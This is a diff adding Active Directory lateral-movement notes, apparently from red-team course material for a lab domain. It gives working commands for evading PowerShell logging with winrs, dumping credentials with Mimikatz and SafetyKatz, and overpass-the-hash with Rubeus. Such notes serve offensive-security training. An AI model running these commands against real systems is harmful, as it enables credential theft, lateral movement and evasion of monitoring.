@@ -250,3 +250,60 @@ Think of PowerShell Remoting (PSRemoting) as psexec on steroids but much more si
 * Uses WinRM and listens by default on 5985 (HTTP) and 5986 (HTTPS).
 * It is the recommended way to manage Windows Core servers.
 * The remoting process runs as a high integrity process. That is, you get an elevated shell.
+
+PowerShell remoting supports the system-wide transcripts and deep script block logging. 
+* We can use winrs in place of PSRemoting to evade the logging (and still reap the benefit of 5985 allowed between hosts):
+```
+winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
+```
+
+### Lateral Movement - Credential Extraction
+
+Local Security Authority (LSA) is responsible for authentication on a Windows machine. 
+Local Security Authority Subsystem Service (LSASS) is its service. 
+
+LSASS stores credentials in multiple forms - NT hash, AES, Kerberos tickets and so on. Credentials are stored by LSASS when a user:
+* Logs on to a local session or RDP
+* Uses RunAs
+* Run a Windows service
+* Runs a scheduled task or batch job
+* Uses a Remote Administration tool
+
+The LSASS process is therefore a very attractive target. It is also the most monitored process on a Windows machine. 
+Some of the credentials that can be extracted without touching LSASS
+* SAM hive (Registry) - Local credentials
+* LSA Secrets/SECURITY hive (Registry) - Service account passwords, 
+
+Domain cached credentials etc.
+* DPAPI Protected Credentials (Disk) - Credentials Manager/Vault, Browser Cookies, Certificates, Azure Tokens etc
+
+### Lateral Movement - Mimikatz
+mimikatz can be used to extract credentials, tickets, replay credentials, play with AD security and many more interesting attacks!
+
+Dump credentials on a using Mimikatz.
+```
+mimikatz.exe -Command '"sekurlsa::ekeys"' 
+```
+Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
+```
+SafetyKatz.exe "sekurlsa::ekeys" 
+```
+From a Linux attacking machine using impacket. 
+
+### Lateral Movement - Credential Extraction - LSASS
+
+Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs elevation (Run as administrator)
+```
+SafetyKatz.exe "sekurlsa::pth /user:administrator /domain: dollarcorp.moneycorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"
+```
+
+Over Pass the hash (OPTH) generate tokens from hashes or keys
+
+ * Below doesn't need elevation
+ ```
+Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
+```
+* Below command needs elevation
+```
+Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
